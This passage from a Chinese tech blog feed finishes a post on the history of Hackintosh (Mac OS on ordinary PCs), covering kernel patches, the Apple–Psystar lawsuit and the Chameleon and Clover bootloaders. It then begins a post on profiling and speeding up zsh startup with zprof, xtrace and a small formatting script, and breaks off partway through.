年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span 